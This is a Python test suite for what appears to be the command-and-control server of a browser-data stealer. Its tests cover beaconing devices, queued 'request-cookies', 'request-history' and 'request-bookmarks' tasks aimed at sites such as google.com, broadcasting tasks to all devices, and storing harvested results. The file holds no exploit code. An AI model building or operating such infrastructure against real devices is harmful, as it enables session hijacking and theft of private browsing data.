"""Tests for the CommandHandler (server-side state management)."""

import pytest
from datetime import datetime, timezone

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from command_handler import CommandHandler
from models import DeviceInfo


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def fresh_handler() -> CommandHandler:
    """A handler with no devices — tests the initial empty state."""
    return CommandHandler()


@pytest.fixture
def handler() -> CommandHandler:
    """Handler pre-populated with sample devices for task/result tests."""
    h = CommandHandler()
    h._seed_sample_devices()
    return h


# ---------------------------------------------------------------------------
# Initialisation (fresh, unseeded state)
# ---------------------------------------------------------------------------

class TestInitialisation:
    """Tests for CommandHandler initialisation — starts empty."""

    def test_starts_with_no_devices(self, fresh_handler: CommandHandler) -> None:
        assert len(fresh_handler.devices) == 0

    def test_has_default_beacon_interval(self, fresh_handler: CommandHandler) -> None:
        assert fresh_handler.server_config.beacon_interval == 15

    def test_has_default_protocol_http(self, fresh_handler: CommandHandler) -> None:
        assert fresh_handler.server_config.communication_protocol == "http"

    def test_task_queues_empty(self, fresh_handler: CommandHandler) -> None:
        assert fresh_handler.all_pending_tasks() == {}

    def test_task_registry_empty(self, fresh_handler: CommandHandler) -> None:
        assert len(fresh_handler.task_registry) == 0


# ---------------------------------------------------------------------------
# Device registration
# ---------------------------------------------------------------------------

class TestDeviceRegistration:
    """Tests for register_device and get_device."""

    def test_register_new_device(self, handler: CommandHandler) -> None:
        device = DeviceInfo(name="new-dev", ip="10.0.0.1")
        handler.register_device(device)
        assert "new-dev" in handler.devices
        assert handler.devices["new-dev"].ip == "10.0.0.1"

    def test_register_updates_existing(self, handler: CommandHandler) -> None:
        device = DeviceInfo(name="device-alpha", ip="10.0.0.99")
        handler.register_device(device)
        assert handler.devices["device-alpha"].ip == "10.0.0.99"

    def test_register_updates_last_seen(self, handler: CommandHandler) -> None:
        before = datetime.now(timezone.utc)
        device = DeviceInfo(name="device-alpha", ip="10.0.0.1")
        handler.register_device(device)
        assert handler.devices["device-alpha"].last_seen >= before

    def test_get_device_returns_device(self, handler: CommandHandler) -> None:
        device = handler.get_device("device-alpha")
        assert device is not None
        assert device.name == "device-alpha"

    def test_get_device_returns_none_for_unknown(
        self, handler: CommandHandler
    ) -> None:
        assert handler.get_device("no-such-device") is None

    def test_register_device_with_cookies(
        self, handler: CommandHandler
    ) -> None:
        device = DeviceInfo(
            name="cookie-dev",
            ip="10.0.0.5",
            cookies={"session": "abc"},
        )
        handler.register_device(device)
        assert handler.devices["cookie-dev"].cookies == {"session": "abc"}


# ---------------------------------------------------------------------------
# Task queue management
# ---------------------------------------------------------------------------

class TestTaskQueue:
    """Tests for per-device task queue operations."""

    def test_queue_task_creates_task_for_device(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task("device-alpha", "request-cookies")
        assert task.task_type == "request-cookies"
        assert task.task_id  # non-empty UUID
        assert handler.pending_task_count("device-alpha") == 1

    def test_queue_task_registers_task_type(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task("device-alpha", "request-cookies")
        assert handler.task_registry[task.task_id] == "request-cookies"

    def test_queue_task_with_parameters(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task(
            "device-alpha",
            "request-cookies",
            {"domains": "google.com,github.com"},
        )
        assert task.parameters == {"domains": "google.com,github.com"}

    def test_queue_multiple_tasks_for_same_device(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-alpha", "request-history")
        handler.queue_task("device-alpha", "request-bookmarks")
        assert handler.pending_task_count("device-alpha") == 3

    def test_dequeue_returns_all_tasks(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-alpha", "request-history")
        tasks = handler.dequeue_tasks("device-alpha")
        assert len(tasks) == 2
        assert tasks[0].task_type == "request-cookies"
        assert tasks[1].task_type == "request-history"

    def test_dequeue_removes_tasks(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.dequeue_tasks("device-alpha")
        assert handler.pending_task_count("device-alpha") == 0

    def test_dequeue_empty_returns_empty_list(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.dequeue_tasks("device-alpha")
        assert tasks == []

    def test_dequeue_unknown_device_returns_empty_list(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.dequeue_tasks("no-such-device")
        assert tasks == []

    def test_queue_task_for_all_devices(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.queue_task_for_all("request-cookies")
        assert len(tasks) == 3  # 3 seeded devices
        for name in ["device-alpha", "device-beta", "device-gamma"]:
            assert handler.pending_task_count(name) == 1

    def test_queue_task_for_all_with_parameters(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.queue_task_for_all(
            "request-cookies", {"domains": "google.com"}
        )
        for task in tasks:
            assert task.parameters == {"domains": "google.com"}

    def test_all_pending_tasks_summary(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-alpha", "request-history")
        handler.queue_task("device-beta", "request-bookmarks")
        pending = handler.all_pending_tasks()
        assert pending["device-alpha"] == 2
        assert pending["device-beta"] == 1
        assert "device-gamma" not in pending

    def test_all_pending_tasks_empty(
        self, handler: CommandHandler
    ) -> None:
        pending = handler.all_pending_tasks()
        assert pending == {}

    def test_tasks_are_per_device_isolated(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-beta", "request-history")
        handler.dequeue_tasks("device-alpha")
        assert handler.pending_task_count("device-alpha") == 0
        assert handler.pending_task_count("device-beta") == 1


# ---------------------------------------------------------------------------
# Result storage
# ---------------------------------------------------------------------------

class TestStoreResult:
    """Tests for store_result()."""

    def test_store_result_persists_on_device(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task("device-alpha", "request-cookies")
        handler.store_result(task.task_id, "device-alpha", {"output": "cookies"}, True)
        result = handler.devices["device-alpha"].results.get("request-cookies")
        assert result is not None
        assert result["data"] == {"output": "cookies"}
        assert result["success"] is True

    def test_store_result_uses_task_type_from_registry(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task("device-alpha", "request-history")
        handler.store_result(task.task_id, "device-alpha", {}, True)
        assert "request-history" in handler.devices["device-alpha"].results

    def test_store_result_removes_from_registry(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task("device-alpha", "request-cookies")
        handler.store_result(task.task_id, "device-alpha", {}, True)
        assert task.task_id not in handler.task_registry

    def test_store_result_unknown_device_does_not_raise(
        self, handler: CommandHandler
    ) -> None:
        handler.store_result("fake-id", "nonexistent-device", {}, True)

    def test_store_result_overwrites_previous_for_same_type(
        self, handler: CommandHandler
    ) -> None:
        task1 = handler.queue_task("device-alpha", "request-cookies")
        handler.store_result(task1.task_id, "device-alpha", {"output": "first"}, True)
        task2 = handler.queue_task("device-alpha", "request-cookies")
        handler.store_result(task2.task_id, "device-alpha", {"output": "second"}, True)
        result = handler.devices["device-alpha"].results["request-cookies"]
        assert result["data"] == {"output": "second"}
